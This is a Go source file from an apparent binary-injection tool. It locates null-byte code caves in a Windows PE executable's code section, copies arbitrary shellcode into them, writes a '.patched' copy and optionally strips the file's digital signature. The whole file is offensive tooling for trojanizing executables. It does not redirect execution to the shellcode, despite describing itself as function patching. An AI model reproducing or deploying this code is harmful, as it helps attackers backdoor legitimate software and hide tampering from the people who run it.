package injector

import (
	"encoding/binary"
	"fmt"
	"os"

	"github.com/Binject/debug/pe"
)

// injectFunction performs function patching injection
// This method finds a suitable function in the PE file and replaces it with shellcode
func (i *Injector) injectFunction(pePath string, shellcode []byte) (*Result, error) {
	// Open PE file with Binject/debug for more functionality
	file, err := pe.Open(pePath)
	if err != nil {
		return &Result{
			Success: false,
			Message: fmt.Sprintf("Failed to open PE file: %v", err),
		}, err
	}
	defer file.Close()

	// Read the original file
	data, err := os.ReadFile(pePath)
	if err != nil {
		return &Result{
			Success: false,
			Message: fmt.Sprintf("Failed to read PE file: %v", err),
		}, err
	}

	// Find code cave or suitable location
	caveOffset, caveSize, err := findCodeCave(data, len(shellcode))
	if err != nil {
		return &Result{
			Success: false,
			Message: fmt.Sprintf("Failed to find code cave: %v", err),
		}, err
	}

	if caveSize < len(shellcode) {
		return &Result{
			Success: false,
			Message: fmt.Sprintf("Code cave too small: need %d, found %d", len(shellcode), caveSize),
		}, fmt.Errorf("code cave too small")
	}

	// Copy shellcode into code cave
	copy(data[caveOffset:], shellcode)

	// Output path
	outputPath := pePath + ".patched"

	// Write modified file
	if err := os.WriteFile(outputPath, data, 0644); err != nil {
		return &Result{
			Success: false,
			Message: fmt.Sprintf("Failed to write output file: %v", err),
		}, err
	}

	// Clear signature if not preserving
	if !i.options.PreserveSig {
		if err := ClearSignature(outputPath); err != nil {
			// Non-fatal error
			fmt.Printf("Warning: failed to clear signature: %v\n", err)
		}
	}

	return &Result{
		Success:    true,
		Message:    fmt.Sprintf("Function patch injection successful. Shellcode placed at offset 0x%X", caveOffset),
		OutputPath: outputPath,
	}, nil
}

// findCodeCave finds a suitable code cave in the PE file
func findCodeCave(data []byte, minSize int) (offset int, size int, err error) {
	// Parse PE headers to find code section
	if len(data) < 64 {
		return 0, 0, fmt.Errorf("file too small")
	}

	// Check DOS header
	if data[0] != 'M' || data[1] != 'Z' {
		return 0, 0, fmt.Errorf("invalid DOS header")
	}

	// Get PE header offset
	peOffset := int(binary.LittleEndian.Uint32(data[60:64]))
	if peOffset >= len(data) {
		return 0, 0, fmt.Errorf("invalid PE header offset")
	}

	// Check PE signature
	if data[peOffset] != 'P' || data[peOffset+1] != 'E' {
		return 0, 0, fmt.Errorf("invalid PE signature")
	}

	// Get number of sections
	coffOffset := peOffset + 4
	numSections := int(binary.LittleEndian.Uint16(data[coffOffset+2 : coffOffset+4]))
	optHeaderSize := int(binary.LittleEndian.Uint16(data[coffOffset+16 : coffOffset+18]))

	// Calculate section header offset
	sectionOffset := coffOffset + 20 + optHeaderSize

	// Search for code caves in each section
	for i := 0; i < numSections; i++ {
		secOffset := sectionOffset + (i * 40)
		if secOffset+40 > len(data) {
			break
		}

		// Get section info
		rawSize := int(binary.LittleEndian.Uint32(data[secOffset+16 : secOffset+20]))
		rawOffset := int(binary.LittleEndian.Uint32(data[secOffset+20 : secOffset+24]))

		// Check if this is a code section (.text)
		sectionName := string(data[secOffset : secOffset+8])
		if !isCodeSection(sectionName) {
			continue
		}

		// Look for null bytes (potential code cave)
		caveStart := -1
		caveLen := 0

		for j := rawOffset; j < rawOffset+rawSize && j < len(data); j++ {
			if data[j] == 0 {
				if caveStart == -1 {
					caveStart = j
				}
				caveLen++
			} else {
				if caveLen >= minSize && caveStart != -1 {
					return caveStart, caveLen, nil
				}
				caveStart = -1
				caveLen = 0
			}
		}

		// Check last cave
		if caveLen >= minSize && caveStart != -1 {
			return caveStart, caveLen, nil
		}
	}

	return 0, 0, fmt.Errorf("no suitable code cave found")
}

// isCodeSection checks if a section name indicates a code section
func isCodeSection(name string) bool {
	// Common code section names
	codeSections := []string{".text", "CODE", ".code", "INIT", "PAGE"}
	for _, cs := range codeSections {
		if len(name) >= len(cs) && name[:len(cs)] == cs {
			return true
		}
	}
	return false
}
